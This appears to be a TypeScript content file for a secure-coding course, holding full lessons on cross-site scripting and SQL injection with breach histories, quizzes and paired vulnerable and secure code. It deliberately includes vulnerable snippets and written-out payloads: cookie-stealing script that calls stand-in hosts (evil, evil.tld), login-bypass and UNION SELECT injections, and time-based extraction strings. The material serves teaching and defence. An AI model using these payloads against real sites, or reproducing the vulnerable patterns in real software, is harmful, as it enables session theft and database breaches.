// ============================================================
// SecureDevHub — XSS (03) & SQL Injection (04) · FULL CONTENT
// ============================================================
import type { SecurityModule } from "./types";

export const XSS_SQLI_MODULES: SecurityModule[] = [
  /* ---------------- 03 · CROSS-SITE SCRIPTING (FULL) ---------------- */
  {
    id: "xss",
    number: 3,
    title: "Cross-Site Scripting (XSS)",
    icon: "code-xml",
    severity: "critical",
    categories: ["frontend", "backend"],
    time: "15 min",
    difficulty: "Beginner",
    updated: "Jan 2026",
    owaspLabel: "OWASP A03 — Injection",
    owaspUrl: "https://owasp.org/Top10/A03_2021-Injection/",
    tagline:
      "Attackers inject JavaScript into your pages and it runs with your users' full trust — reading cookies, hijacking sessions, defacing sites.",
    what: {
      text: "XSS happens when attacker-controlled data is rendered as code in a victim's browser. The browser can't tell your trusted scripts from the injected ones, so it executes both with the same origin's privileges. One unescaped username, comment or query parameter is enough.",
      analogy:
        "A restaurant menu board where customers can write their own dish — and the kitchen cooks whatever is written, no questions asked. Someone writes 'give me the keys to the register' in the form of a dish.",
      terms: [
        { term: "Payload", def: "The malicious script the attacker injects, e.g. <script>fetch('//evil/?c='+document.cookie)</script>" },
        { term: "Output encoding", def: "Converting special characters (<, >, \", ') into harmless HTML entities before rendering, so the browser shows them as text instead of executing them." },
        { term: "CSP", def: "Content Security Policy — an HTTP header that tells the browser which scripts are allowed to run, blocking injected ones." },
        { term: "Source / Sink", def: "A source is where untrusted data enters (location.search, postMessage); a sink is where it executes (innerHTML, eval, document.write). DOM XSS connects the two." },
      ],
    },
    why: {
      text: "XSS has been in the OWASP Top 10 for over twenty years and still shows up in roughly two-thirds of tested web apps. A single stored XSS on a payment page can skim tens of thousands of credit cards before anyone notices.",
      breaches: [
        {
          company: "British Airways",
          year: "2018",
          impact: "380,000 credit cards skimmed, £20M ICO fine",
          details:
            "Magecart attackers modified the Modernizr library on BA's payment page, adding 22 lines of JavaScript that copied every keystroke to a look-alike domain — baways.com. Read the full case study in our blog.",
        },
        {
          company: "MySpace (Samy worm)",
          year: "2005",
          impact: "1 million profiles infected in 20 hours",
          details:
            "Samy Kamkar stored a self-propagating XSS worm in his profile. Everyone who viewed it got infected and added 'but most of all, samy is my hero' to their page — the fastest-spreading virus of its era.",
        },
        {
          company: "Yahoo Mail",
          year: "2013",
          impact: "Accounts hijacked via cookie theft",
          details:
            "A stored XSS in Yahoo's mail interface let attackers steal session cookies from anyone who opened a crafted email, granting full mailbox access without a password.",
        },
      ],
      stats: [
        { value: "~65%", label: "of web applications tested show at least one XSS flaw" },
        { value: "20+ yrs", label: "XSS has featured in the OWASP Top 10 continuously" },
        { value: "22 lines", label: "of injected JS cost British Airways £20 million" },
      ],
    },
    how: {
      steps: [
        "Attacker finds an input that is reflected into a page: search box, comment form, username, error message, URL fragment.",
        "They craft a payload — often <script> or an event handler like <img src=x onerror=...> — designed to survive any naive filtering.",
        "The payload reaches a victim's browser: immediately (reflected via a link), via the database (stored), or purely client-side (DOM-based).",
        "The browser executes the script with the site's full privileges — it can read non-HttpOnly cookies, localStorage tokens, and act as the user.",
        "Stolen sessions and data are exfiltrated to the attacker's server; the site looks completely normal to the victim.",
      ],
      types: [
        { name: "Stored XSS", desc: "Payload is saved (comment, username) and fires for every visitor. The most dangerous — it scales by itself." },
        { name: "Reflected XSS", desc: "Payload rides a crafted link and bounces off the server into the response. Needs a victim click." },
        { name: "DOM-based XSS", desc: "Never touches the server: client JS reads location/hash/postMessage (source) and writes to innerHTML (sink)." },
      ],
    },
    vulnerable: [
      {
        lang: "javascript",
        label: "Node.js + DOM",
        mark: [2, 9],
        code: `// VULNERABLE — reflected via server-rendered template string
app.get('/search', (req, res) => {
  res.send('<h1>Results for: ' + req.query.q + '</h1>');
  // ?q=<script>fetch('https://evil.tld/'+document.cookie)</script>
});

// VULNERABLE — DOM-based, never touches the server
const params = new URLSearchParams(location.search);
document.getElementById('welcome').innerHTML =
  'Welcome back, ' + params.get('name');
// /page#name=<img src=x onerror=alert(document.domain)>

// VULNERABLE — jQuery shortcut (same bug)
$('#comments').append(userComment);`,
      },
      {
        lang: "python",
        label: "Python + Flask",
        mark: [4, 9],
        code: `# VULNERABLE — markupsafe bypassed on purpose
from flask import Flask, request, render_template_string

@app.route('/search')
def search():
    return render_template_string(
        '<h1>Results for: ' + request.args.get('q', '') + ' | safe</h1>'
    )  # string concat happens BEFORE Jinja can escape anything

@app.route('/profile/<name>')
def profile(name):
    return f'<p>Hello {name}</p>'   # f-string HTML — /profile/<script>...</script>`,
      },
      {
        lang: "php",
        label: "PHP",
        mark: [2, 8],
        code: `<?php
// VULNERABLE — direct echo of user input
echo '<h1>Results for: ' . $_GET['q'] . '</h1>';
?><!-- ?q=<script>...</script> executes instantly -->

<div class="comment">
  <!-- VULNERABLE — stored XSS from the database -->
  <?= $row['body'] ?>
</div>`,
      },
    ],
    secure: [
      {
        lang: "javascript",
        label: "Node.js + DOM",
        mark: [2, 3, 4, 9, 13, 14],
        code: `// SECURE — escape output, use textContent, add CSP
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q);            // < → &lt; etc.
  res.set('Content-Security-Policy',
    "default-src 'self'; script-src 'self'");   // injected scripts blocked
  res.send('<h1>Results for: ' + q + '</h1>');
});

// SECURE — DOM: textContent can never become markup
const params = new URLSearchParams(location.search);
document.getElementById('welcome').textContent =
  'Welcome back, ' + params.get('name');

// SECURE — when users need real HTML (rich text editor):
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userHtml,
  { ALLOWED_TAGS: ['b', 'i', 'em', 'a'], ALLOWED_ATTR: ['href'] });

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
}`,
      },
      {
        lang: "python",
        label: "Python + Flask",
        mark: [3, 4, 10],
        code: `# SECURE — Jinja2 autoescapes every variable by default
@app.route('/search')
def search():
    return render_template('search.html', q=request.args.get('q', ''))
    # search.html: <h1>Results for: {{ q }}</h1>  → auto-escaped

@app.route('/profile/<name>')
def profile(name):
    return render_template('profile.html', name=name)   # never f-strings into HTML

# SECURE — if you must render user HTML: sanitize first (bleach)
import bleach
clean = bleach.clean(user_html, tags=['b', 'i', 'a'], attributes={'a': ['href']})

@app.after_request
def set_headers(resp):
    resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return resp`,
      },
      {
        lang: "php",
        label: "PHP",
        mark: [2, 3, 8, 13],
        code: `<?php
// SECURE — htmlspecialchars encodes every special character
$q = htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES, 'UTF-8');
echo '<h1>Results for: ' . $q . '</h1>';

header("Content-Security-Policy: default-src 'self'; script-src 'self'");
?>

<div class="comment">
  <!-- SECURE — escaped output everywhere; HTML Purifier for rich text -->
  <?= htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') ?>
</div>

<?php
// Rich text allowed? Use HTMLPurifier, not regexes:
$purifier = new HTMLPurifier();
$clean = $purifier->purify($row['body']);`,
      },
    ],
    fixes: [
      "All reflected values are HTML-entity encoded before they reach the page.",
      "DOM updates use textContent (never innerHTML) so injected tags are inert text.",
      "User-supplied rich HTML passes through DOMPurify (JS), bleach (Python) or HTMLPurifier (PHP) with a strict tag allowlist.",
      "A Content-Security-Policy header blocks inline scripts as defense-in-depth — even a bypassed filter can't execute.",
      "Sensitive cookies are HttpOnly so even successful XSS can't steal sessions.",
    ],
    rules: [
      "Never insert user input into HTML, attributes or JavaScript without context-appropriate encoding.",
      "Use auto-escaping template engines (Jinja2, ESX, Blade, EJS with <%- -%>) — and never disable escaping with |safe / raw.",
      "In the DOM, write user data with textContent/setAttribute — not innerHTML, outerHTML or document.write.",
      "Sanitize unavoidable user HTML with DOMPurify/bleach/HTMLPurifier using a minimal allowlist.",
      "Deploy a strict Content Security Policy (script-src 'self', no unsafe-inline) as a safety net.",
      "Set HttpOnly + Secure + SameSite on session cookies to limit the blast radius.",
      "Validate and encode on both client and server — encode at the point of output, where context is known.",
    ],
    quiz: [
      {
        q: "Which XSS type persists the payload in the database and attacks every visitor?",
        options: ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Blind XSS"],
        correct: 1,
        why: "Stored XSS is saved server-side (comments, usernames, reviews) and executes for every user who loads the page — that's what let the Samy worm infect a million profiles.",
      },
      {
        q: "What is the single most reliable DOM fix for rendering user text?",
        options: [
          "innerHTML with a regex that removes <script>",
          "textContent",
          "escape() the string first",
          "Base64-encode it",
        ],
        correct: 1,
        why: "textContent writes text, never markup — the browser parses no tags at all. Regexes and escape() are bypassable; encoding belongs at the output boundary.",
      },
      {
        q: "In DOM-based XSS, a 'sink' is…",
        options: [
          "Where untrusted data enters (e.g. location.search)",
          "Where untrusted data executes (e.g. innerHTML)",
          "The attacker's server",
          "The database",
        ],
        correct: 1,
        why: "Sources (URL, postMessage, referer) feed sinks (innerHTML, eval, document.write). Break the connection by encoding or using safe sinks like textContent.",
      },
      {
        q: "How does a strict Content-Security-Policy help against XSS?",
        options: [
          "It encrypts cookies",
          "It blocks scripts from disallowed origins/inline code, so injected payloads can't run",
          "It sanitizes user input server-side",
          "It rate-limits attackers",
        ],
        correct: 1,
        why: "CSP with script-src 'self' (no unsafe-inline) means <script> injected into your HTML simply doesn't execute — even if encoding was missed. It's defense-in-depth, not a replacement for escaping.",
      },
      {
        q: "Why does the HttpOnly cookie flag matter in an XSS context?",
        options: [
          "It prevents cookies being sent to any page",
          "It stops JavaScript — including injected XSS — from reading the cookie",
          "It encrypts the cookie",
          "It expires cookies faster",
        ],
        correct: 1,
        why: "Most XSS payloads aim for document.cookie. HttpOnly removes that access, so the attacker can't steal the session identifier even when a payload executes.",
      },
    ],
    mistakes: [
      {
        mistake: "Sanitizing only on the client side",
        explanation:
          "Client validation is a UX feature, not a security boundary. Attackers POST directly with curl and your filters never run.",
        fix: "Encode/sanitize again at every server-side output point.",
      },
      {
        mistake: "Blacklisting '<script>' with regex",
        explanation:
          "<img src=x onerror=...>, <svg onload=...>, case mutations and nested tags all bypass it. Blacklists lose by construction.",
        fix: "Encode output, or use a real parser-based sanitizer (DOMPurify, bleach) with an allowlist.",
      },
      {
        mistake: "Disabling the framework's escaping 'just for this block'",
        explanation:
          "Every |safe, raw() or dangerouslySetInnerHTML is a hole in your defense — and they're often left in during refactors.",
        fix: "Keep autoescaping on; sanitize rich text explicitly with an allowlist library instead.",
      },
      {
        mistake: "Forgetting attribute and JavaScript contexts",
        explanation:
          "HTML-encoding isn't enough inside href='...' (javascript: URLs) or inline <script> blocks — each context needs its own encoding.",
        fix: "Validate URL schemes (allow http/https only), JSON-encode for JS contexts, and prefer text nodes everywhere.",
      },
    ],
    tools: [
      { name: "DOMPurify", desc: "The standard XSS sanitizer for HTML/SVG — fast, heavily audited.", url: "https://github.com/cure53/DOMPurify", price: "Free" },
      { name: "OWASP ZAP", desc: "Free scanner that finds reflected/stored XSS automatically.", url: "https://www.zaproxy.org", price: "Free" },
      { name: "CSP Evaluator", desc: "Google's tool to test whether your CSP would actually stop XSS.", url: "https://csp-evaluator.withgoogle.com", price: "Free" },
      { name: "XSStrike", desc: "Fuzzing suite tuned for discovering tricky XSS contexts.", url: "https://github.com/s0md3v/XSStrike", price: "Free" },
    ],
    reading: [
      { title: "XSS Prevention Cheat Sheet", source: "OWASP Cheat Sheet Series", type: "Docs", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      { title: "DOM based XSS Prevention Cheat Sheet", source: "OWASP", type: "Docs", url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" },
      { title: "Cross-site scripting", source: "MDN Web Docs", type: "Docs", url: "https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" },
      { title: "Web Security Academy — XSS labs", source: "PortSwigger", type: "Course", url: "https://portswigger.net/web-security/cross-site-scripting" },
    ],
  },

  /* ---------------- 04 · SQL INJECTION (FULL) ---------------- */
  {
    id: "sql-injection",
    number: 4,
    title: "SQL Injection",
    icon: "database",
    severity: "critical",
    categories: ["backend"],
    time: "16 min",
    difficulty: "Beginner",
    updated: "Jan 2026",
    owaspLabel: "OWASP A03 — Injection",
    owaspUrl: "https://owasp.org/Top10/A03_2021-Injection/",
    tagline:
      "One string-concatenated query can hand an attacker your entire database — read it, change it, drop it. Twenty-five years old and still devastating.",
    what: {
      text: "SQL injection occurs when user input is concatenated into a SQL query string, letting attackers rewrite the query itself. Instead of searching for a product, the input is executed as database logic — bypassing logins, dumping tables, or wiping data.",
      analogy:
        "You tell a courier: 'Deliver this box to Alice.' Someone writes on the box: 'Alice. Also, bring me the keys and the safe.' A query built from raw strings can't separate instructions from data.",
      terms: [
        { term: "Parameterized query", def: "A query where SQL and data travel separately: 'WHERE id = ?' plus the value. The driver never lets the value become SQL — the only real fix." },
        { term: "Union-based SQLi", def: "Appending UNION SELECT to pull data from other tables into the page's normal output." },
        { term: "Blind SQLi", def: "No visible output — the attacker infers data one bit at a time from page differences (boolean) or response delays (time-based)." },
        { term: "ORM", def: "Object-Relational Mapper (Django ORM, Sequelize, Eloquent). Safe by default — until you call raw()/literal SQL with concatenation." },
      ],
    },
    why: {
      text: "SQLi is the breach that keeps on breaching: it exposes every row you store — passwords, cards, medical data — and it's so automatable that teenage attackers and worms do it at internet scale.",
      breaches: [
        {
          company: "Heartland Payment Systems",
          year: "2008",
          impact: "134 million credit cards stolen",
          details:
            "Attackers entered through a SQL injection in a web form and spent months reading card data. At the time, the largest breach ever — all from one injectable input.",
        },
        {
          company: "TalkTalk",
          year: "2015",
          impact: "157,000 customers, record £400k ICO fine",
          details:
            "A 17-year-old used SQL injection on three vulnerable pages to extract the customer database. The CEO admitted the attack 'could have been prevented with basic defences.'",
        },
        {
          company: "Sony PlayStation Network",
          year: "2011",
          impact: "77 million accounts, 23 days of outage",
          details:
            "Attackers used SQL-injection tooling against outdated infrastructure. PSN went dark for over three weeks; estimated cost exceeded $170M.",
        },
      ],
      stats: [
        { value: "134M", label: "cards lost to a single SQLi at Heartland" },
        { value: "42%", label: "of hacker-observed web application attack attempts are SQL injection exploits" },
        { value: "$170M+", label: "estimated cost of the Sony PSN breach" },
      ],
    },
    how: {
      steps: [
        "Attacker submits a single quote (') in every parameter and watches for errors — a 500 response or SQL syntax message confirms string concatenation.",
        "They map the query: ' OR '1'='1 turns authentication into a tautology and logs in as the first user (often admin).",
        "Using UNION SELECT, they align column counts and pull arbitrary tables into page output — users, cards, password hashes.",
        "If nothing is displayed, they go blind: boolean probes (AND 1=1 vs AND 1=2) or time delays (AND SLEEP(5)) extract data one bit per request.",
        "sqlmap automates the entire chain — fingerprint the DBMS, enumerate schemas, dump every row.",
      ],
      types: [
        { name: "Classic (In-band)", desc: "Results of the injected query appear directly in the page or error messages." },
        { name: "Union-based", desc: "UNION SELECT grafts attacker-chosen rows onto legitimate output for fast exfiltration." },
        { name: "Blind (Boolean/Time)", desc: "Nothing is shown — data is inferred from true/false page differences or response timing, one bit at a time." },
      ],
    },
    vulnerable: [
      {
        lang: "javascript",
        label: "Node.js",
        mark: [3, 4, 13],
        code: `// VULNERABLE — string concatenation builds the query
app.post('/login', (req, res) => {
  const query =
    "SELECT * FROM users WHERE email = '" + req.body.email +
    "' AND password = '" + req.body.password + "'";
  db.query(query, (err, rows) => {
    if (rows.length) login(rows[0]);   // email: admin'--   logs in as admin
  });
});

// VULNERABLE — template literal interpolation is the same bug
const id = req.params.id;
db.query('SELECT * FROM products WHERE id = ' + id);
// /products/1 OR 1=1 UNION SELECT user,pass,NULL FROM users--`,
      },
      {
        lang: "python",
        label: "Python / Flask + Django",
        mark: [4, 5, 11],
        code: `# VULNERABLE — f-string into raw SQL
@app.route('/user/<username>')
def get_user(username):
    cur = db.cursor()
    cur.execute(f"SELECT * FROM users WHERE name = '{username}'")
    # /user/' OR '1'='1'-- returns the first user
    return jsonify(cur.fetchall())

# VULNERABLE — Django raw() with formatting
from django.db import connection
def search(term):
    with connection.cursor() as c:
        c.execute("SELECT * FROM blog WHERE title LIKE '%" + term + "%'")
        return c.fetchall()`,
      },
      {
        lang: "php",
        label: "PHP",
        mark: [3, 12],
        code: `<?php
// VULNERABLE — $_GET straight into the query
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = " . $id;
$result = mysqli_query($conn, $sql);

// VULNERABLE — even escaping fails when you forget quotes context
$user = mysqli_real_escape_string($conn, $_POST['user']);
$sql = "SELECT * FROM users WHERE name = '" . $user . "'";
// escape_string helps strings but NOT this classic auth bypass style:
// user = ' OR '1'='1   →   WHERE name = '' OR '1'='1'`,
      },
    ],
    secure: [
      {
        lang: "javascript",
        label: "Node.js",
        mark: [3, 4, 12, 13],
        code: `// SECURE — placeholders keep SQL and data separate, always
app.post('/login', async (req, res) => {
  const sql = 'SELECT * FROM users WHERE email = ? AND password_hash = ?';
  const [rows] = await db.execute(sql, [req.body.email, hash(req.body.password)]);
  // mysql2/pg send the value as DATA — quotes inside it change nothing
});

// SECURE — same protection for identifiers other than values
const id = Number.parseInt(req.params.id, 10);
if (!Number.isInteger(id)) return res.status(400).send('bad id');
const sql2 = 'SELECT * FROM products WHERE id = $1';   // pg style
const { rows: products } = await pool.query(sql2, [id]);

// SECURE — least privilege: the app DB user can only SELECT/INSERT
// the tables it needs, and can never DROP. Even a hit stays small.`,
      },
      {
        lang: "python",
        label: "Python / Flask + Django",
        mark: [4, 10, 14],
        code: `# SECURE — parameterized placeholders (%s) — never f-strings
@app.route('/user/<username>')
def get_user(username):
    cur = db.cursor()
    cur.execute('SELECT * FROM users WHERE name = %s', (username,))
    return jsonify(cur.fetchall())

# SECURE — Django ORM escapes everything by default
User.objects.get(username=username)

# SECURE — if you truly need raw SQL, still bind params:
with connection.cursor() as c:
    c.execute('SELECT * FROM blog WHERE title LIKE %s', ['%' + term + '%'])
    rows = c.fetchall()`,
      },
      {
        lang: "php",
        label: "PHP",
        mark: [3, 4, 5, 6, 11, 12],
        code: `<?php
// SECURE — prepared statements with mysqli
$stmt = $conn->prepare('SELECT * FROM products WHERE id = ?');
$stmt->bind_param('i', $id);          // typed binding
$stmt->execute();
$result = $stmt->get_result();

// SECURE — or PDO, with emulation disabled for true prepares
$pdo = new PDO($dsn, $user, $pass, [
  PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
  PDO::ATTR_EMULATE_PREPARES => false,
]);
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = :name');
$stmt->execute(['name' => $_POST['user']]);`,
      },
    ],
    fixes: [
      "Every value goes through a placeholder (?, %s, $1, :name) — SQL and data never share a string.",
      "Identifiers that can't be parameterized (table/column names) are chosen from hardcoded allowlists, never from request data.",
      "ORM query builders do the binding for you; raw() escape hatches use params, not f-strings/concatenation.",
      "The database account the app uses has least privilege (no DROP/ALTER, scoped to its schema), so a successful injection can't take the whole server.",
      "Errors are logged server-side and never echoed to the response — error-based SQLi feeds on verbose messages.",
    ],
    rules: [
      "Use parameterized queries/prepared statements for 100% of database access — no exceptions.",
      "Never concatenate or interpolate user input into a SQL string, even 'just numbers'.",
      "Cast expected integers (parseInt / (int) / isInt) before binding identifiers and IDs.",
      "Prefer ORMs, and when you must drop to raw SQL, bind parameters there too.",
      "Run the app with a least-privilege DB user; split read/write accounts for risky queries.",
      "Suppress database errors in responses; log them privately instead.",
      "Add a WAF as a second layer — never as the primary defense.",
    ],
    quiz: [
      {
        q: "What does the payload ' OR '1'='1 attempt to do?",
        options: [
          "Crash the server with a syntax error",
          "Turn a WHERE clause into a tautology so every row matches (auth bypass)",
          "Encrypt the database",
          "Exfiltrate data over DNS",
        ],
        correct: 1,
        why: "Concatenated into WHERE email='' AND pass='' it becomes WHERE ... OR '1'='1' — always true — so the first row, often admin, 'logs in'.",
      },
      {
        q: "Why do parameterized queries stop SQL injection?",
        options: [
          "They encrypt user input",
          "The driver sends SQL and values separately — input can never become syntax",
          "They escape all quotes for you",
          "They are faster than concatenation",
        ],
        correct: 1,
        why: "Structure and data travel on different channels to the engine. A quote inside a value is just a character in a string, never a string terminator.",
      },
      {
        q: "How does an attacker extract data via time-based blind SQLi?",
        options: [
          "Reading response bodies",
          "Using SLEEP()-style delays: 'if the first letter is A, wait 5 seconds' — measuring response time per guess",
          "Sniffing TLS traffic",
          "Viewing page source",
        ],
        correct: 1,
        why: "Conditional delays like ' AND IF(SUBSTRING(pass,1,1)='a', SLEEP(5), 0)-- turn the clock into an output channel, one bit per request.",
      },
      {
        q: "Which of these is still injectable?",
        options: [
          "db.execute('SELECT * FROM t WHERE id = ?', [id])",
          "Statement prepare + bind in PDO with emulation off",
          "f-strings: cur.execute(f\"... WHERE name = '{name}'\")",
          "Django ORM: User.objects.get(name=name)",
        ],
        correct: 2,
        why: "f-strings interpolate before the driver sees anything — the value has already become SQL syntax. Every other option binds data separately.",
      },
      {
        q: "mysqli_real_escape_string is…",
        options: [
          "As safe as prepared statements in every context",
          "Helpful for quoted strings but breaks down for numbers/identifiers and charset edge cases — use prepared statements",
          "A function that parameterizes queries",
          "Required for PDO to work",
        ],
        correct: 1,
        why: "Escaping only protects inside string quotes and has historic bypasses (charset tricks). Prepared statements make injection structurally impossible, so they're the recommended fix.",
      },
    ],
    mistakes: [
      {
        mistake: "Thinking input validation alone stops SQLi",
        explanation: "Dates, names with apostrophes (O'Brien) and search terms are legitimate inputs that still break queries when concatenated.",
        fix: "Validation rejects bad input; parameterization makes injection impossible. You need both.",
      },
      {
        mistake: "Escaping quotes manually everywhere",
        explanation: "One missed call, one numeric context without quotes, one charset oddity — and the escape hatch becomes the entry point.",
        fix: "Prepared statements for everything; escape only as belt-and-suspenders on legacy code.",
      },
      {
        mistake: "Believing 'the ORM makes me immune'",
        explanation: "ORMs protect their query builder, not User.objects.raw('...' + term) or Sequelize.literal(userInput).",
        fix: "Treat raw/literal SQL APIs as loaded weapons: bind params even there.",
      },
      {
        mistake: "Running the app as the database superuser",
        explanation: "A single injection then reads every schema, writes files (INTO OUTFILE) or executes OS commands (xp_cmdshell).",
        fix: "Least-privilege DB accounts per service; disable dangerous features; network-segment the DB.",
      },
    ],
    tools: [
      { name: "sqlmap", desc: "The automatic SQLi detection & exploitation tool — point it at your own staging apps.", url: "https://sqlmap.org", price: "Free" },
      { name: "OWASP ZAP", desc: "Free scanner with active SQLi attack modes.", url: "https://www.zaproxy.org", price: "Free" },
      { name: "jSQL Injection", desc: "Java-based GUI injection testing tool.", url: "https://github.com/ron190/jsql-injection", price: "Free" },
    ],
    reading: [
      { title: "SQL Injection Prevention Cheat Sheet", source: "OWASP Cheat Sheet Series", type: "Docs", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
      { title: "Query Parameterization Cheat Sheet", source: "OWASP", type: "Docs", url: "https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" },
      { title: "Web Security Academy — SQL injection", source: "PortSwigger", type: "Course", url: "https://portswigger.net/web-security/sql-injection" },
      { title: "Understanding SQL Injection", source: "MDN Web Docs", type: "Article", url: "https://developer.mozilla.org/en-US/docs/Glossary/SQL_Injection" },
    ],
  },
];
